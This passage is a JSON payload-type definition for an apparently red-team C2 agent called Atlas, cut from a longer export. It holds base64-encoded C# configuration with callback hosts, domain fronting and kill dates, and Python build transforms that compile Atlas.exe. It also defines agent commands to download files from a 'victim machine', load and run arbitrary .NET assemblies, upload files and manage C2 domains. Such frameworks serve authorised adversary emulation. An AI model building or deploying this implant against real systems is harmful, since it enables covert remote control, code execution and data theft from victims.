          "script": "ZnVuY3Rpb24oaGVhZGVyLCBlbGVtZW50LCB1bmlxdWVfaWQpewoJLy90YWtlcyBpbiBpbmZvcm1hdGlvbiBhYm91dCB0aGUgaGVhZGVyIHRvIG1ha2UgYW5kIHRoZSBlbGVtZW50IHRvIGNvbGxhcHNlIHdpdGhpbiBpdCAoYXMgYSBzdHJpbmcpCgl2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPjxhIGNsYXNzPSdidG4nIHR5cGU9J2J1dHRvbicgZGF0YS10b2dnbGU9J2NvbGxhcHNlJyBkYXRhLXRhcmdldD0nI2JzdGFzayIgKyB1bmlxdWVfaWQgKyAiJyBhcmlhLWV4cGFuZGVkPSdmYWxzZScgYXJpYS1jb250cm9scz0nYnN0YXNrIiArIHVuaXF1ZV9pZCArICInPiIrIGhlYWRlclsnbmFtZSddICsgIjwvYT48L2Rpdj4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J2NvbGxhcHNlJyBpZD1cImJzdGFzayIgKyB1bmlxdWVfaWQgKyAiXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nYmctY2FyZC1ib2R5LWwyIGNhcmQtYm9keSBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz4iICsgZWxlbWVudCArICI8L2Rpdj48L2Rpdj48L2Rpdj4iOwogIHJldHVybiBvdXRwdXQ7Cn0="
        }
      ],
      "c2_profiles": {
        "default": [
          {
            "Config_temp.cs": "dXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7Cm5hbWVzcGFjZSBBdGxhcwp7CiAgICBwdWJsaWMgY2xhc3MgQ29uZmlnCiAgICB7CiAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gQ2FsbGJhY2tIb3N0cyA9IG5ldyBMaXN0PHN0cmluZz4geyAiY2FsbGJhY2tfaG9zdDpjYWxsYmFja19wb3J0IiB9OwogICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxVdGlscy5TZXJ2ZXI+IFNlcnZlcnMgPSBuZXcgTGlzdDxVdGlscy5TZXJ2ZXI+IHsgfTsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXlsb2FkVVVJRCA9ICIlVVVJRCUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVVSUQgPSAiIjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVc2VyQWdlbnQgPSAiVVNFUl9BR0VOVCI7CiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSG9zdEhlYWRlciA9ICJkb21haW5fZnJvbnQiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50IFNsZWVwID0gY2FsbGJhY2tfaW50ZXJ2YWw7CiAgICAgICAgcHVibGljIHN0YXRpYyBpbnQgSml0dGVyID0gY2FsbGJhY2tfaml0dGVyOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEtpbGxEYXRlID0gImtpbGxkYXRlIjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXJhbSA9ICIlUEFSQU0lIjsKICAgICAgICBwdWJsaWMgY29uc3QgaW50IENodW5rU2l6ZSA9ICVDSFVOS19TSVpFJTsKICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgRGVmYXVsdFByb3h5ID0gJURFRkFVTFRfUFJPWFklOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5QWRkcmVzcyA9ICIlUFJPWFlfQUREUkVTUyUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5VXNlciA9ICIlUFJPWFlfVVNFUiUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5UGFzc3dvcmQgPSAiJVBST1hZX1BBU1NXT1JEJSI7CiNpZiAoREVGQVVMVCB8fCBERUZVTEFUX1BTSyB8fCBERUZBVUxUX0VLRSkKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcmwgPSAiL2FwaS92MS40L2FnZW50X21lc3NhZ2UiOwojZW5kaWYKI2lmIChEZWZhdWx0X1BTSyB8fCBERUZBVUxUX0VLRSkKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQc2sgPSAiQUVTUFNLIjsKI2VuZGlmCiNpZiBERUZBVUxUX0VLRQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFNlc3Npb25JZCA9ICIiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIHRlbXBVVUlEID0gIiI7CiAgICAgICAgcHVibGljIHN0YXRpYyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJTQUNyeXB0b1NlcnZpY2VQcm92aWRlciBSc2E7CiNlbmRpZgogICAgICAgIHB1YmxpYyBzdGF0aWMgRGljdGlvbmFyeTxzdHJpbmcsIHN0cmluZz4gTW9kdWxlcyA9IG5ldyBEaWN0aW9uYXJ5PHN0cmluZywgc3RyaW5nPigpOwogICAgfQp9"
          }
        ]
      },
      "load_transforms": [],
      "create_transforms": [
        {
          "parameter": "",
          "description": "",
          "transform": "atlas_stamp_parameters",
          "parameter_type": "None",
          "order": 10
        },
        {
          "parameter": "",
          "description": "Compile Atlas payload",
          "transform": "atlas_compile_and_return",
          "parameter_type": "None",
          "order": 11
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the username to use to authenticate to the proxy server",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 9
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the password to use to authenticate to the proxy server",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 8
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the proxy address to use for web requests ",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 7
        },
        {
          "parameter": "4.0\n3.5",
          "description": "",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 1
        },
        {
          "parameter": "true\nfalse",
          "description": "True will use the system's default proxy settings, false will use proxy settings specify below",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 6
        },
        {
          "parameter": "512000",
          "description": "Specify the chunking size to use for download\/upload and command output",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 5
        },
        {
          "parameter": "id",
          "description": "Specify the query parameter to use for GET requests",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 4
        },
        {
          "parameter": "DEFAULT_EKE\nDEFAULT_PSK\nDEFAULT",
          "description": "Profile\/encryption to use",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 3
        },
        {
          "parameter": "x64\nx86\nanycpu",
          "description": "Architecture to target when compiling",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 2
        }
      ],
      "transforms": [
        {
          "code": "YXN5bmMgZGVmIHN3YXBfc2hvcnRuYW1lcyhzZWxmLCB0YXNrX3BhcmFtczogc3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICAjIHNldHMgYSBmbGFnIHRvIHN3YXAgcGFyYW1ldGVycyB0aGF0IGVuZCBpbiBfaWQgd2l0aCBmaWxlbmFtZXMgaWYgdGhlIGN1cnJlbnQgdmFsdWUgZXhpc3RzIGFzIGEgZmlsZSBuYW1lDQogICAgaW1wb3J0IGpzb24NCiAgICB0cnk6DQogICAgICAgIHBhcmFtcyA9IGpzb24ubG9hZHModGFza19wYXJhbXMpDQogICAgICAgIHBhcmFtc1snc3dhcF9zaG9ydG5hbWVzJ10gPSBUcnVlDQogICAgICAgIHJldHVybiBqc29uLmR1bXBzKHBhcmFtcykNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KCJjYW4ndCBhZGQgc3dhcF9zaG9ydG5hbWVzIGZpZWxkIHNpbmNlIGl0J3Mgbm90IGpzb24iKQ0KICAgIHJldHVybiB0YXNrX3BhcmFtcw==",
          "name": "swap_shortnames",
          "parameter_type": "None",
          "description": "Swap *_id parameter filename to corresponding file_id",
          "is_command_code": true,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 2,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX2xvYWRhc3NlbWJseV9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQ0KICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoNCiAgICAgICAgdGFza19kaWN0ID0ganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykNCiAgICAgICAgdGFza19kaWN0WydyZW1vdGVfcGF0aCddID0gJycNCiAgICAgICAgcmV0dXJuIGpzb24uZHVtcHModGFza19kaWN0LCBzb3J0X2tleXM9VHJ1ZSkNCiAgICB0YXNrX2RpY3QgPSB7ImFzc2VtYmx5X2lkIjogdGFza19wYXJhbXMsICJyZW1vdGVfcGF0aCI6ICIifQ0KICAgIHJldHVybiBqc29uLmR1bXBzKHRhc2tfZGljdCk=",
          "name": "atlas_loadassembly_shorthand",
          "parameter_type": "None",
          "description": "Swap out filenames for needed file_id",
          "is_command_code": true,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 1,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3VwbG9hZF9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQ0KICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoNCiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zDQogICAgcGllY2VzID0gdGFza19wYXJhbXMuc3BsaXQoIiAiKQ0KICAgIHRhc2tfZGljdCA9IHsiYXNzZW1ibHlfaWQiOiBwaWVjZXNbMF0sICJyZW1vdGVfcGF0aCI6ICcgJy5qb2luKHBpZWNlc1sxOl0pfQ0KICAgIHJldHVybiBqc29uLmR1bXBzKHRhc2tfZGljdCk=",
          "name": "atlas_upload_shorthand",
          "parameter_type": "None",
          "description": "Swap out filename for needed file_id",
          "is_command_code": true,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 3,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3J1bmFzc2VtYmx5X3Nob3J0aGFuZChzZWxmLCB0YXNrX3BhcmFtczpzdHIsIHBhcmFtZXRlcjogTm9uZSkgLT4gc3RyOg0KICAgIGltcG9ydCBqc29uDQogICAgaWYgbGVuKHRhc2tfcGFyYW1zKSA9PSAwOg0KICAgICAgICByYWlzZSBFeGNlcHRpb24oIk1pc3NpbmcgcGFyYW1ldGVycyIpDQogICAgaWYgdGFza19wYXJhbXNbMF0gPT0gInsiOg0KICAgICAgICByZXR1cm4gdGFza19wYXJhbXMNCiAgICBwaWVjZXMgPSB0YXNrX3BhcmFtcy5zcGxpdCgiICIpDQogICAgdGFza19kaWN0ID0geyJhc3NlbWJseV9pZCI6IHBpZWNlc1swXSwgImFyZ3MiOiAiICIuam9pbihwaWVjZXNbMTpdKX0NCiAgICByZXR1cm4ganNvbi5kdW1wcyh0YXNrX2RpY3Qp",
          "name": "atlas_runassembly_shorthand",
          "parameter_type": "None",
          "description": "Swap out filename for needed file_id",
          "is_command_code": true,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 4,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3N0YW1wX3BhcmFtZXRlcnMoc2VsZiwgcHJpb3Jfb3V0cHV0OiBOb25lLCBwYXJhbWV0ZXI6IHN0cikgLT4gYnl0ZWFycmF5OgogICAgaWYgbGVuKHNlbGYuc2F2ZWRfYXJyYXkpIDwgNjoKICAgICAgICByYWlzZSBFeGNlcHRpb24oIkluY29ycmVjdCBudW1iZXIgb2Ygc2F2ZWQgYXJndW1lbnRzIikKICAgIHV1aWQgPSBvcGVuKCJ7fS9VdWlkLnR4dCIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTEgPSBvcGVuKCJ7fS9Db25maWdfdGVtcC5jcyIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTIgPSBvcGVuKCJ7fS9Db25maWcuY3MiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3cnKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCIlVVVJRCUiLCB1dWlkLnN0cmlwKCkpCiAgICBpZiBzZWxmLnNhdmVkX2FycmF5WzNdIGlzIG5vdCBOb25lIGFuZCBzZWxmLnNhdmVkX2FycmF5WzNdIGlzIG5vdCAiIjoKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVQQVJBTSUnLCBzZWxmLnNhdmVkX2FycmF5WzNdKQogICAgZWxzZToKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVQQVJBTSUnLCAnaWQnKQogICAgaWYgc2VsZi5zYXZlZF9hcnJheVs0XSBpcyBub3QgTm9uZSBhbmQgc2VsZi5zYXZlZF9hcnJheVs0XSBpcyBub3QgIiI6CiAgICAgICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclQ0hVTktfU0laRSUnLCBzZWxmLnNhdmVkX2FycmF5WzRdKQogICAgZWxzZToKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVDSFVOS19TSVpFJScsIHN0cig1MTIwMDApKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclREVGQVVMVF9QUk9YWSUnLCBzZWxmLnNhdmVkX2FycmF5WzVdKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfQUREUkVTUyUnLCBzZWxmLnNhdmVkX2FycmF5WzZdKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfVVNFUiUnLCBzZWxmLnNhdmVkX2FycmF5WzddKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfUEFTU1dPUkQlJywgc2VsZi5zYXZlZF9hcnJheVs4XSkKICAgIGZpbGUyLndyaXRlKGZpbGUxKQogICAgZmlsZTIuY2xvc2UoKQ==",
          "name": "atlas_stamp_parameters",
          "parameter_type": "None",
          "description": "Stamp in parameters for Atlas payload",
          "is_command_code": false,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 8,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX2NvbXBpbGVfYW5kX3JldHVybihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBieXRlYXJyYXk6DQogICAgdHJ5Og0KICAgICAgICBpZiBsZW4oc2VsZi5zYXZlZF9hcnJheSkgPCA2Og0KICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJJbmNvcnJlY3QgbnVtYmVyIG9mIHNhdmVkIGFyZ3VtZW50cyIpDQogICAgICAgIGFyY2ggPSBzZWxmLnNhdmVkX2FycmF5WzFdDQogICAgICAgIHByb2ZpbGUgPSBzZWxmLnNhdmVkX2FycmF5WzJdDQogICAgICAgIGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjQuMCI6DQogICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL21jcyAtdGFyZ2V0OndpbmV4ZSAtc2RrOjQgLXBsYXRmb3JtOnt9IC1kZWZpbmU6XCJUUkFDRSx7fVwiIC1vcHRpbWl6ZSsgLW91dDpBdGxhcy5leGUgQ29uZmlnLmNzICBDcnlwdG8uY3MgIEh0dHBfNC4wLmNzIE1vZHVsZXMuY3MgIFByb2dyYW0uY3MgVXRpbHMuY3MiLmZvcm1hdChhcmNoLCBwcm9maWxlKQ0KICAgICAgICBlbGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjMuNSI6DQogICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL2dtY3MgL25vY29uZmlnIC9kZWJ1Zy0gL29wdGltaXplKyAvb3V0OkF0bGFzLmV4ZSBDb25maWcuY3MgQ3J5cHRvLmNzIEh0dHBfMy41LmNzIE1vZHVsZXMuY3MgUHJvZ3JhbS5jcyBVdGlscy5jcyAvdGFyZ2V0OndpbmV4ZSAvZGVmaW5lOlRSQUNFLHt9IC9wbGF0Zm9ybTp7fSAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uWG1sLkxpbnEuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLkRhdGEuRGF0YVNldEV4dGVuc2lvbnMuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby9nYWMvTWljcm9zb2Z0LkNTaGFycC80LjAuMC4wX19iMDNmNWY3ZjExZDUwYTNhL01pY3Jvc29mdC5DU2hhcnAuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLkRhdGEuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLlhtbC5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uQ29yZS5kbGwgL3dhcm46NCIuZm9ybWF0KHByb2ZpbGUsIGFyY2gpDQogICAgICAgIHByb2MgPSBhd2FpdCBhc3luY2lvLmNyZWF0ZV9zdWJwcm9jZXNzX3NoZWxsKGNvbW1hbmQsIHN0ZG91dD1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRlcnI9YXN5bmNpby5zdWJwcm9jZXNzLlBJUEUsIGN3ZD1zZWxmLndvcmtpbmdfZGlyKQ0KICAgICAgICBzdGRvdXQsIHN0ZGVyciA9IGF3YWl0IHByb2MuY29tbXVuaWNhdGUoKQ0KICAgICAgICBpZiBzdGRvdXQ6DQogICAgICAgICAgICBwcmludChmJ1tzdGRvdXRdXG57c3Rkb3V0LmRlY29kZSgpfScpDQogICAgICAgIGlmIHN0ZGVycjoNCiAgICAgICAgICAgIHByaW50KGYnW3N0ZGVycl1cbntzdGRlcnIuZGVjb2RlKCl9JykNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoInt9L0F0bGFzLmV4ZSIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpKToNCiAgICAgICAgICAgIHJldHVybiBieXRlYXJyYXkob3Blbigie30vQXRsYXMuZXhlIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpciksICdyYicpLnJlYWQoKSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICMgc29tZXRoaW5nIHdlbnQgd3JvbmcsIHJldHVybiBvdXIgZXJyb3JzDQogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oc3RkZXJyLmRlY29kZSgpKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKHN0ZGVyci5kZWNvZGUoKSArIHN0ZG91dC5kZWNvZGUoKSk=",
          "name": "atlas_compile_and_return",
          "parameter_type": "None",
          "description": "Compile atlas payload",
          "is_command_code": false,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 7,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfc3RyaW5nX3BhcmFtZXRlcihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBOb25lOgogICAgc2VsZi5zYXZlZF9hcnJheS5hcHBlbmQocGFyYW1ldGVyKQogICAgcmV0dXJuIE5vbmU=",
          "name": "save_string_parameter",
          "parameter_type": "String",
          "description": "Save a string parameter to saved_array",
          "is_command_code": false,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 6,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfcGFyYW1ldGVyKHNlbGYsIHByaW9yX291dHB1dDogTm9uZSwgcGFyYW1ldGVyOiBzdHIpIC0+IE5vbmU6CiAgICBzZWxmLnNhdmVkX2FycmF5LmFwcGVuZChwYXJhbWV0ZXIpCiAgICByZXR1cm4gTm9uZQ==",
          "name": "save_parameter",
          "parameter_type": "ChooseOne",
          "description": "Save a value as the next element in self.saved_array",
          "is_command_code": false,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 5,
          "operator": "apfell_admin"
        }
      ],
      "commands": [
        {
          "needs_admin": false,
          "help_cmd": "config [info | domain | sleep | jitter | host_header | user_agent | param | proxy] [add | remove | use_default | address | username | password] [options]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "config\t\t\t\tbase command\noptions:\ninfo\t\t\t\tdisplay current agent configuration\ndomain\t\t\t\toption to add\/remove C2 domain\n\tadd\t\t\t\tadd a C2 domain to list of domains\n\tremove\t\t\tremove a C2 domain from list of domains (will not let list be less then one domain)\nsleep\t\t\t\tsleep time between taskings in seconds\njitter\t\t\t\tvariation in sleep time, specify as a percentage\nkill_date\t\t\tdate for agent to exit itself\nhost_header\t\t\thost header to use for domain fronting\nuser_agent\t\t\tuser-agent header for web requests\nparam\t\t\t\toption for query parameter used in GET requests\nproxy\t\t\t\toption to modify proxy settings\n\tuse_default\t\ttrue\/false, choose whether to use system default settings or manual settings specified in config\n\taddress\t\t\taddress of proxy server\n\tusername\t\tusername to authenticate to proxy server\n\tpassword\t\tpassword to authenticate to proxy server\nExamples:\nconfig info\nconfig domain add http:\/\/hello.world\nconfig sleep 60\nconfig jitter 20\nconfig kill_date 2020-03-01\nconfig host_header cdn.cloudfront.com\nconfig user_agent Mozilla 5.0 IE blah blah blah\nconfig param order\nconfig proxy use_default false\nconfig proxy address 192.168.1.100\nconfig proxy username harm.j0y\nconfig proxy password Liv3F0rTh3Tw!ts",
          "cmd": "config",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "download [path to remote file]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": true,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}",
          "cmd": "download",
          "parameters": [
            {
              "type": "String",
              "hint": "Path to remote file to be downloaded",
              "choices": "",
              "required": true,
              "name": "file_path"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "loadassembly [assembly filename]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Load an arbitrary .NET assembly via Assembly.Load and track the assembly FullName to call for execution with the runassembly command. If assembly is loaded through Apfell's services -> host file, then operators can simply specify the filename from the uploaded file",
          "cmd": "loadassembly",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "loadassembly",
              "command_id": 3,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            },
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "loadassembly",
              "command_id": 3,
              "payload_type": "atlas",
              "transform": "atlas_loadassembly_shorthand",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "upload {\"assembly_id\": 65, \"remote_path\": \"path to file\"}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Take a file from the database and store it on disk through the callback.",
          "cmd": "upload",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            },
            {
              "type": "String",
              "hint": "Path to save the remote file too (default is current directory)",
              "choices": "",
              "required": true,
              "name": "remote_path"
            }
          ],
          "attack": [
            {
              "t_num": "T1132",
              "attack_name": "Data Encoding"
            },
            {
              "t_num": "T1030",
              "attack_name": "Data Transfer Size Limits"
            },
            {
              "t_num": "T1041",
              "attack_name": "Exfiltration Over Command and Control Channel"
            }
          ],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "upload",
              "command_id": 4,
              "payload_type": "atlas",
              "transform": "atlas_upload_shorthand",
              "parameter_type": "None"
            },
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "upload",
              "command_id": 4,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "exit",
          "version": 1,
          "is_exit": true,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This exits the current atlas instance by leveraging the Environment.Exit class method.",
          "cmd": "exit",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "runassembly [filename] [assembly arguments]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Execute the entrypoint of a assembly loaded by the loadassembly command and redirect the console output back to the Apfell server.",
          "cmd": "runassembly",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            },
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "args"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "runassembly",
              "command_id": 6,
              "payload_type": "atlas",
              "transform": "atlas_runassembly_shorthand",
              "parameter_type": "None"
            },
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "runassembly",
              "command_id": 6,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "jobkill [job id]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Kills a running job and removes it from the atlas instance's list of running jobs.",
          "cmd": "jobkill",
          "parameters": [
            {
              "type": "String",
              "hint": "The Job Id for the running job to be killed",
              "choices": "",
              "required": true,
              "name": "job_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "listloaded",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve a list of .NET assemblies loaded via the loadassembly command. ",
          "cmd": "listloaded",
          "parameters": [],
          "attack": [],
